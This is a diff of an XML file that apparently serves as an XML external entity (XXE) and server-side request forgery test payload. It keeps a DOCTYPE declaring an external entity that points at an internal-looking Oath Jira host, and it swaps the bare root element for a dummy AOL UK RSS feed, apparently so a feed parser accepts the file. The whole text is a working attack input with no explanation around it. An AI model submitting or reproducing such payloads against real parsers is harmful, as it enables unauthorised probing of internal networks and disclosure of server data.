@@ -3,4 +3,19 @@
 <!ELEMENT r ANY >
 <!ENTITY sp SYSTEM "https://jira.ouroath.com">
 ]>
-<r>&sp;</r>
+<rss version="2.0">
+  <channel>
+    <title><![CDATA[AOL UK News feed ]]></title>
+    <link>http://www.aol.com</link>
+    <description>a</description>
+    <lastBuildDate>Mon, 01 Oct 2018 00:00:00 -0000</lastBuildDate>
+    <item>
+        <title><![CDATA[AOL UK News feed ]]></title>
+       <link>http://www.aol.com</link>
+       <description>a</description>
+      <pubDate>Mon, 01 Oct 2018 00:00:00 -0000</pubDate>
+      <author>a</author>
+    </item>
+    
+    </channel>
+    </rss>
